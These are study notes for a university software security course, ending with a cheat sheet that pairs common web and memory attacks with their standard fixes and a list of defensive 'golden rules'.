| **Pentest-Tools.com** | Real-world | Online platform for testing real apps for broken auth and other vulns in professional pen tests |

> ⚠️ Only use pentest tools on apps you **own or have explicit permission to test**. Using them on others' apps without permission is illegal.



---

---

---

---

# QUICK REFERENCE: ATTACK vs. FIX CHEAT SHEET

| Attack | How It Works | Fix |
|--------|-------------|-----|
| **SQLi** | Malicious SQL injected into input → DB runs hacker's query | Parameterized queries / Prepared statements |
| **LFI** | `../` in URL param to access local server files | Whitelist of allowed pages only |
| **RFI** | Remote URL in param → server loads hacker's file | Whitelist of allowed local pages only |
| **XSS** | `<script>` in input → runs in victims' browsers | `htmlspecialchars()` / output encoding |
| **Buffer Overflow** | More data than buffer can hold → overwrites memory | `strncpy`, size limits, ASLR, DEP, Stack Canaries |
| **BAC / IDOR** | Changing ID in URL to access others' data | Auth check on every request; deny by default |
| **Session Hijacking** | Steal session cookie via XSS or network interception | HTTPS, HttpOnly cookies, new session ID on login |
| **Password Spraying** | Try common passwords across many accounts | Complexity requirements, lockout policy |
| **Credential Stuffing** | Use stolen password lists on your login | MFA, breached password checks |
| **Spoofing** | Fake identity (email, IP, website) to trick users/systems | DKIM/SPF for email; HTTPS certificates; validate URLs |
| **Phishing** | Social engineering using fake trusted entities | User awareness training; MFA |

---

# GOLDEN RULES SUMMARY

> 1. **"Security is risk management."** — Identify, rank, track, repeat. Never just once.
> 2. **"High quality ≠ Secure. Secure ≠ High quality. You need BOTH."**
> 3. **"Design flaws account for 50% of sec problems — you can't find them just by reading code."**
> 4. **"Never expose internal error details to users. Log securely for admins."**
> 5. **"Deny access by default. If no explicit permission = no access."**
> 6. **"Input from users = ZERO trust. Always validate before using."**
> 7. **"Static analysis alone is NOT enough. Combine w/ dynamic testing, pen testing, and code reviews."**
> 8. **"Security is not just coding — it's a CULTURE."** — Ch.5, Slide 16
> 9. **"Don't store what you don't need. Encrypt what you keep."** — Ch.3
> 10. **"Shift security LEFT — address it early in design, not as an afterthought after coding."**
> 11. **"Without logging and monitoring, breaches cannot be detected."** — OWASP A09
> 12. **"Spoofing is a tool; phishing is a goal. Know the difference — both require user awareness."**

---
*Notes compiled from: Chapter 1–8 PPTX slides + DEMO PDFs (LFI, RFI, XSS) | CCSB5133 Software Security*
